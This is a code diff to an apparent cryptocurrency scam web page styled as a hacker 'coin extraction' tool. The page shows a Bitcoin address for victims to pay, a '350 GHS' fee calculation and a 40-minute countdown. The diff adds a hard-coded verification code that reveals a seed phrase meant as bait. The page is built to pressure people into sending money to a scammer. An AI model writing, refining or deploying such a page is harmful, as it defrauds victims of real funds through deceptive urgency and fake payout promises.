@@ -179,7 +179,7 @@
         <div style="background:#001a00; border:2px solid #00ff41; padding:35px; text-align:center;">
             <h2>COMPLETE PAYOUT SEQUENCE</h2>
             <button onclick="initiatePayout()" style="padding:16px 55px; font-size:24px; margin:25px 0;">REQUEST COIN EXTRACTION</button>
-            <div id="payoutResult" style="margin-top:30px; text-align:left; font-size:18px; min-height:220px;"></div>
+            <div id="payoutResult" style="margin-top:30px; text-align:left; font-size:18px; min-height:300px;"></div>
         </div>
         <div class="footer">ALL TRAFFIC END-TO-END ENCRYPTED • MONERO NETWORK • ZERO LOG POLICY • MILITARY-GRADE OPSEC</div>
     </div>
@@ -228,7 +228,7 @@
             }, 1200);
         }
 
-        // Start OSINT (slow ~100s+)
+        // Start OSINT
         let attemptCount = 0;
         function startConjoining() {
             document.getElementById('mainInterface').style.display = 'none';
@@ -310,7 +310,7 @@
             }, 2200);
         }
 
-        // Payout with GHS + 40-minute timer
+        // Payout with GHS + Timer + Verification Code
         let timerInterval;
         function initiatePayout() {
             const res = document.getElementById('payoutResult');
@@ -319,26 +319,49 @@
                 Destination Address:<br>
                 <span style="background:#111; padding:6px; user-select:all; display:inline-block; margin:8px 0;">bc1q5pdz8uchw2zfs2hqle5t703kqupwce2kfvztr7</span><br><br>
                 GHS Calculation: 7,700,000 ÷ 22,000 = <strong>350 GHS</strong><br><br>
-                <span id="countdown" class="amber" style="font-size:22px;">TIME REMAINING: 40:00</span><br>
-                Complete GHS block to finalize extraction.
+                <span id="countdown" class="amber" style="font-size:22px;">TIME REMAINING: 40:00</span><br><br>
+                <span class="green">After payout completion, a 4-digit verification code will be sent.</span><br><br>
+                <input type="text" id="verifyCode" placeholder="ENTER 4-DIGIT CODE" maxlength="4" style="max-width:280px; text-align:center;">
+                <button onclick="submitVerificationCode()" style="width:auto; padding:10px 30px; display:inline-block;">VERIFY CODE</button>
+                <div id="verifyStatus" style="margin-top:15px; min-height:30px;"></div>
             `;
 
-            let timeLeft = 40 * 60; // 40 minutes in seconds
-
+            let timeLeft = 40 * 60;
             if (timerInterval) clearInterval(timerInterval);
             
             timerInterval = setInterval(() => {
                 timeLeft--;
                 const minutes = Math.floor(timeLeft / 60);
                 const seconds = timeLeft % 60;
-                document.getElementById('countdown').textContent = 
-                    `TIME REMAINING: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
-                
+                const countdownEl = document.getElementById('countdown');
+                if (countdownEl) {
+                    countdownEl.textContent = `TIME REMAINING: ${minutes}:${seconds < 10 ? '0' : ''}${seconds}`;
+                }
                 if (timeLeft <= 0) {
                     clearInterval(timerInterval);
-                    res.innerHTML += `<br><br><span class="green">[PROCESSING] PAYOUT INITIATED • FUNDS PROPAGATING THROUGH MONERO NETWORK...</span>`;
                 }
             }, 1000);
+        }
+
+        function submitVerificationCode() {
+            const code = document.getElementById('verifyCode').value.trim();
+            const status = document.getElementById('verifyStatus');
+            
+            if (code === "5910") {
+                status.style.color = "#00ff41";
+                status.innerHTML = `
+                    <span class="green">[VERIFIED] CONGRATULATIONS</span><br><br>
+                    Your payout is processing successfully.<br><br>
+                    Wallet Extension Seed:<br>
+                    <span onclick="navigator.clipboard.writeText(this.textContent)" style="background:#111; padding:8px; display:block; margin:12px 0; cursor:pointer; user-select:all;">
+                        color pill property pepper father upset sock win sense will someone avoid
+                    </span><br>
+                    <span class="green">Funds routed securely. OPSEC LEVEL 5.</span>
+                `;
+            } else {
+                status.style.color = "#ff4444";
+                status.textContent = "ERROR: Invalid code. Try again.";
+            }
         }
 
         document.getElementById('password').addEventListener('keypress', e => { if (e.key === 'Enter') attemptLogin(); });
